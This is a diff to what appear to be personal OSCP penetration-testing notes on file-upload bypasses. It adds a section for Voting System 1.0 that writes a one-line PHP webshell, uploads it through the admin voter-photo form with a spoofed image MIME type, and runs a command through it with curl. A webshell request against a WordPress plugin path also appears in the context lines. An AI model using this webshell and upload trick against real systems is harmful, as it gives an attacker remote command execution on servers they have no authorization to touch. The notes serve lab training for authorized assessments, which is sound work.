@@ -311,6 +311,34 @@ curl -s "http://$BoxIP/wp-content/uploads/simple-file-list/shell.php?cmd=id"
 
 ## **Outstanding**
 This area grows alongside the modules. Whenever a new upload-bypass trick comes up (magic-byte/MIME spoofing, double extensions, polyglot files, etc), add it here with a link back to the source section.
+
+---
+
+## Voting System 1.0 authenticated voter-photo upload
+
+When the Voting System 1.0 administrator session is available, the voter creation form can accept a PHP webshell in the `photo` field when the multipart part is declared as an image. The redirect to `voters.php` is not execution proof; request the resulting `/images/` path and run a harmless identity command.
+
+```bash
+cat > "$BoxDir/exploits/probe.php" <<'EOF'
+<?php echo shell_exec($_GET["cmd"]); ?>
+EOF
+
+curl -sS -i -b "$CookieFile" \
+  -F "photo=@$BoxDir/exploits/probe.php;type=image/png" \
+  --form-string 'firstname=a' \
+  --form-string 'lastname=b' \
+  --form-string 'password=1' \
+  --form-string 'add=' \
+  "http://$BoxIP/Admin/voters_add.php"
+
+curl -sS -G --data-urlencode 'cmd=whoami' \
+  "http://$BoxIP/images/probe.php"
+```
+
+If the upload returns a redirect but the follow-up request is `404`, first verify the endpoint, filename, and current session. A redirect alone only proves that the form handler completed its response path. Review [[OSCP/BOXES/WRITE UPS/Windows/Love|Love]] and [Exploit-DB 49445](https://www.exploit-db.com/exploits/49445).
+
+#### Tags: #VotingSystem #AuthenticatedUpload #PHPWebshell #MIMEType #ExecutionProof #EDB49445
+
 ## External Resources
 
 - [HackTricks - Windows and Linux Pentesting Index](https://hacktricks.wiki/en/index.html)
@@ -330,3 +358,4 @@ This page turns one repeatable part of an authorized assessment into a checklist
 
 - [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
 - [[OSCP/BOXES/WRITE UPS/Linux/Networked|Networked]] -- image/PHP polyglot and source-disclosed upload path
+- [[OSCP/BOXES/WRITE UPS/Windows/Love|Love]] -- authenticated voter-photo upload, MIME declaration, and follow-up execution proof
